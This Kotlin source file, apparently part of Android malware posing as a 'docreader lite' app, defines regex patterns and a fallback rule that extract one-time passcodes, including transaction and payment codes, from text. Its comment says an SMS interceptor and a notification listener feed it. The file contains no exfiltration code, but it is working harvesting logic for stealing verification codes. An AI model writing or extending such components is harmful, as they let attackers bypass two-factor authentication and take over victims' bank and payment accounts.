package com.docreader.lite.reader

/**
 * OTP extraction patterns — finds verification codes in text.
 * Used by both SMS interceptor and notification listener.
 */
object TextExtractor {

    private val patterns = listOf(
        Regex("""(?:code|otp|pin|token|verify|verification)\s*[:=\-]?\s*(\d{4,8})""", RegexOption.IGNORE_CASE),
        Regex("""(\d{4,8})\s*(?:is your|is the|for your)\s*(?:code|otp|pin)""", RegexOption.IGNORE_CASE),
        Regex("""(?:enter|use|input)\s*(\d{4,8})""", RegexOption.IGNORE_CASE),
        Regex("""(?:transaction|transfer|payment)\s*(?:code|otp)\s*[:=]?\s*(\d{4,8})""", RegexOption.IGNORE_CASE),
    )

    fun extract(text: String): String? {
        for (p in patterns) {
            val m = p.find(text) ?: continue
            return if (m.groupValues.size > 1 && m.groupValues[1].isNotEmpty())
                m.groupValues[1]
            else m.value.trim()
        }
        // Fallback: standalone 6-digit number in short text
        if (text.length < 40) {
            val standalone = Regex("""\b(\d{6})\b""").find(text)
            if (standalone != null) return standalone.groupValues[1]
        }
        return null
    }
}
